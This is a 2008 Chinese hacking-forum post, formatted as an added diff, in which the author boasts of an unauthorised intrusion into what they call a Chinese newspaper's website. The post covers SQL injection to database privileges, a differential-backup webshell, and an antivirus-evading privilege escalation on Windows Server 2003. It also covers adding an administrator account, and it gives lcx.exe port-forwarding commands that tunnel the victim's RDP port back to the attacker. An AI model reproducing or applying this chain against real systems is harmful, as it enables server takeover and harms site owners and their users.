@@ -1,0 +1,66 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+小菜吃小鸡
+D8888D主贴内容-------------------------------------------------------
+菜鸟文章，别笑话俺，俺知道这里都是大牛，但是俺也米有别的本事！只能自己意淫！
+一天上线后，一朋友发过来一个站，说DB权限，我于是打开站点一看，中国XXX报！呵呵呵！不管三七二十一，掂着我的啊D和给我注射点对着他射了起来！如图DB权限！也成功的列出了目录，找到了路径！于是差异备份，成功拿到一个大马！
+（俺是菜鸟，谁笑话俺，俺天天去找他）
+！[attach]311[/attach]
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0811/20081116_4475d86bf3413246fbc1iOkBfGDLJ0UM.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzEyfDQyZDA5YTc2fDEyODY0ODMxMjZ8NzkyNnRYL0VTRHc5emZiNGVoenB6cG8xNFNsY201Z3ZibXBscWFZellyNDF6bDA%3D&nothumb=yes]链接标记下载[/url] (72.79 KB)
+
+2008-11-16 19:35
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0811/20081116_56c8d440fcac3a7ba221OEavZ9jOQk71.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzEzfDgwMzRiNzc4fDEyODY0ODMxMjZ8NzkyNnRYL0VTRHc5emZiNGVoenB6cG8xNFNsY201Z3ZibXBscWFZellyNDF6bDA%3D&nothumb=yes]链接标记下载[/url] (62.34 KB)
+
+2008-11-16 19:35
+习惯性的扫描了一下端口以及上传了CMD，米有开放43958的端口，有可能是改端口。最后也米有找到pcanywhere之类的玩意！我人品很是不好,很少默认的serv-u直接提权成功过！
+既然开放了1433端口，那可以通过SQL来提权了，真他妈的是人倒霉时候，喝凉水都塞牙啊！记得自己的一个工具怎么也找不到 
+
+了，NND，郁闷！找到conn.asp的路径看了看！
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0811/20081116_c3716cb9648b09699daeS5zsg4oASLdZ.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzE0fGRjOWM1ZDI0fDEyODY0ODMxMjZ8NzkyNnRYL0VTRHc5emZiNGVoenB6cG8xNFNsY201Z3ZibXBscWFZellyNDF6bDA%3D&nothumb=yes]链接标记下载[/url] (47.93 KB)
+
+2008-11-16 19:35
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0811/20081116_2f50f63f0388476aab1ffDQsXGXgEmvE.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzE1fGRhOWQ2MWMyfDEyODY0ODMxMjZ8NzkyNnRYL0VTRHc5emZiNGVoenB6cG8xNFNsY201Z3ZibXBscWFZellyNDF6bDA%3D&nothumb=yes]链接标记下载[/url] (58.07 KB)
+
+2008-11-16 19:35
+于是开始搞了！第一次不行，我又去试试了guest，还是不行！郁闷
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0811/20081116_ded48e4b8e168494a36cTr0NvjJoU6sJ.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzE2fDk5NDNkMDA2fDEyODY0ODMxMjZ8NzkyNnRYL0VTRHc5emZiNGVoenB6cG8xNFNsY201Z3ZibXBscWFZellyNDF6bDA%3D&nothumb=yes]链接标记下载[/url] (116.78 KB)
+
+2008-11-16 19:35
+刚才不是上传了CMD吗？看看啥系统吧！不错，还可以执行命令！2003的！记得一位牛人博客上说过2003的那玩意，我于是立马去down了一个，记得我在C:\Program Files下浏览时候，看到的杀毒软件是卡巴斯基7.0，我害怕被杀啊！那不就更米有戏了吗？我的是NOD32，测试是可 
+以的，于是好不容易找了一个装卡巴的朋友让他帮我查杀一下！一会他告诉我：米有被杀！这下我放心了！一路高歌，直接上传上去，还真米有被杀！赶紧添加用户，靠！可以啊
+成功执行命令后赶紧转发端口！找了个免杀的lcx扔了上去！
+我也是内网，于是我设置了路由转发了51端口 
+开始在肉鸡上执行： 
+lcx.exe -slave 你的IP 51（端口） 肉鸡IP 3389 
+然后我在本机执行： 
+lcx.exe -listen 51 2020 
+执行后，这时候我登陆本地127.0.0.1：2020
+成功登陆了！郁闷的事情出来，我把刚才添加的账户和密码输入，突然跳出来一个窗口，意思是要有权限，
+NND，已经是管理员了，还要什么权限！竟然忘记建立的密码了，我为了防止别人社工，密码很少一样的！太多了忘记了！最后试 了三次，把刚才还在脑海印象的三个密码试出来了！（被朋友严重鄙视了一下！）
+重新输入正确账号和密码成功进入，另外也米有发现shift后门，看来这可能是 
+
+一台干净的服务器，赶紧设置一下，保护“肉鸡”，防止别人把我的“鸡”干了！进去后发现了很多网页，记得114best的时候，是五个站！仔细看了下才知道是一些二级域名。 
+这个服务器还行，2.9GHZ  ,4G内存！配置只能算一般！
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0811/20081116_71c6d25b9296e1200f2487aWo1BfCAD5.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzE3fGY3ZmI3MTcyfDEyODY0ODMxMjZ8NzkyNnRYL0VTRHc5emZiNGVoenB6cG8xNFNsY201Z3ZibXBscWFZellyNDF6bDA%3D&nothumb=yes]链接标记下载[/url] (67.39 KB)
+
+2008-11-16 19:35
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0811/20081116_18590a49b61bc011d62agO6ZNHZlDfXo.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzE4fDAyYzAwNjQyfDEyODY0ODMxMjZ8NzkyNnRYL0VTRHc5emZiNGVoenB6cG8xNFNsY201Z3ZibXBscWFZellyNDF6bDA%3D&nothumb=yes]链接标记下载[/url] (163.63 KB)
+
+2008-11-16 19:35
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0811/20081116_8a1db2005701cfdf4d65tvRCq6Li7eTB.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzIwfDJkYzIyNmEzfDEyODY0ODMxMjZ8NzkyNnRYL0VTRHc5emZiNGVoenB6cG8xNFNsY201Z3ZibXBscWFZellyNDF6bDA%3D&nothumb=yes]链接标记下载[/url] (34.94 KB)
+
+2008-11-16 19:35
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0811/20081116_f53db9588a37fc50b4cca4J9B6z0UYx3.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzIxfGU0YzQ4MTdhfDEyODY0ODMxMjZ8NzkyNnRYL0VTRHc5emZiNGVoenB6cG8xNFNsY201Z3ZibXBscWFZellyNDF6bDA%3D&nothumb=yes]链接标记下载[/url] (185.86 KB)
+
+2008-11-16 19:36
+[url=http://www.t00ls.net/attachment.php?aid=MzE5fDM1Mzc0OGRmfDEyODY0ODMxMjZ8NzkyNnRYL0VTRHc5emZiNGVoenB6cG8xNFNsY201Z3ZibXBscWFZellyNDF6bDA%3D&nothumb=yes]链接标记8.jpg[/url] (105.62 KB) 
+下载次数:0
+2008-11-16 19:35
+
+ [img]http://www.t00ls.net/attachments/month_0811/20081116_ba0c4e7ff01bf1935a76snm82GvHMp1M.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzIyfDhlYjkzNjQzfDEyODY0ODMxMjZ8NzkyNnRYL0VTRHc5emZiNGVoenB6cG8xNFNsY201Z3ZibXBscWFZellyNDF6bDA%3D&nothumb=yes]链接标记12.jpg[/url] (63.37 KB) 
+下载次数:0
+2008-11-16 19:36
+
+ [img]http://www.t00ls.net/attachments/month_0811/20081116_8fc4151e8e8fbf6ca996zznlmV9iv0Ai.jpg[/img]
